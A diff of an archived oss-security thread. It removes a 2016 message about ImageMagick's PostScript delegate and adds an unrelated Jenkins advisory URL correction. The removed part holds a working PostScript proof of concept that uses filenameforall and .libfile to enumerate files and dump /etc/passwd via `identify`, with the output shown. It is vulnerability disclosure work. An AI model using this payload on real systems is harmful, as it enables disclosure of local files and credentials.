@@ -1,110 +1,18 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/28/13
-Message-ID: <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
-Date: Wed, 28 Sep 2016 13:52:36 -0700
-From: Tavis Ormandy <taviso@...gle.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/06/20/5
+Message-Id: <4D58EA81-17C1-4CBE-8B7A-B24D510320BC@beckweb.net>
+Date: Mon, 20 Jun 2016 19:04:16 +0200
+From: Daniel Beck <ml@...kweb.net>
 To: oss-security@...ts.openwall.com
-Subject: Re: ImageMagick identify "d:" hangs
+Subject: Re: Jenkins plugins -- multiple fixes
 Content-Type: text/plain; charset=utf-8
 
-On Wed, Sep 28, 2016 at 11:16 AM, Tavis Ormandy <taviso@...gle.com> wrote:
-> On Tue, Sep 27, 2016 at 7:56 AM, Bob Friesenhahn
-> <bfriesen@...ple.dallas.tx.us> wrote:
->>
->> On Tue, 27 Sep 2016, Jakub Wilk wrote:
->>
->>> * Bob Friesenhahn <bfriesen@...ple.dallas.tx.us>, 2016-09-27, 08:48:
->>>>
->>>> From my own investigations, I used
->>>>
->>>>  identify -debug all "d:"
->>>>
->>>> and see that a temporary file is reported to be created and then the program hangs which no apparent CPU usage.
->>>
->>>
->>> strace tells me that it waits for input on stdin.
->>> This is a simpler way to make it "hang":
->>>
->>>  identify -
->>
->>
->> This is what I expected was happening.  The main thing to investigate is if the "ImageTragick" patches distributions are using do protect against this possible issue as well.
->>
->
-> You know, you reminded me that the pdf and/or the ps delegate probably
-> allows filesystem enumeration via filenameforall, as far as I know
-> that's permitted with -dSAFER. I think that's probably unexpected.
->
-> For example, if you try to identify a file like this, it will list
-> local usernames on stdout, I guess a real attack would have to encode
-> that in the output somehow, but I only know enough postscript to know
-> i'd rather write bf. Might be a fun exercise for masochistic hackers
-> though.
->
-> $ cat whatever.jpeg
-> %PDF-1.0
-> (/home/*) {==} 256 string filenameforall
-> $ identify whatever.jpeg
-> (/home/taviso)
-> identify.im6: Postscript delegate failed `whatever.jpeg': No such file
-> or directory @ error/pdf.c/ReadPDFImage/677.
->
-> Tavis.
 
-Maybe I'm missing something, because .libfile also works, this seems
-like free arbitrary file disclosure?
+> On 20.06.2016, at 19:00, Daniel Beck <ml@...kweb.net> wrote:
+> 
+> https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2016-05-11
 
-Here is the code I'm testing with (Note: I really don't know much
-postscript - and I hate it).
+Copy & paste is fun. Correct URL:
+https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2016-06-20
 
-$ cat test.ps
-/dumpname {
-    dup             % copy filename
-    dup             % copy filename
-    print           % print filename
-    (\n) print      % print newline
-    status          % stat filename
-    {
-        (stat succeeded\n) print
-        ( ctime:) print
-        64 string cvs print
-        ( atime:) print
-        64 string cvs print
-        ( size:) print
-        64 string cvs print
-        ( blocks:) print
-        64 string cvs print
-        (\n) print
-        (\n) print
-    }{
-        (unable to stat\n\n) print
-    } ifelse
-    .libfile        % open as library
-    {
-        (.libfile returned file\n\n) print
-        64 string readstring
-        pop         % discard result (should proably test)
-        print
-        (\n) print
-    }{
-        (.libfile returned string\n) print
-        print
-        (\n) print
-    } ifelse
-} def
 
-(/etc/pass*) /dumpname load 256 string filenameforall
-
-$ identify test.ps
-/etc/passwd
-stat succeeded
- ctime:1474998792 atime:1474998792 size:2662 blocks:8
-
-.libfile returned file
-
-root:x:0:0:root:/root:/bin/bash
-
-It seems obvious you can manipulate the output based on this. I'd be
-interested to hear why I'm wrong about this.
-
-Tavis.
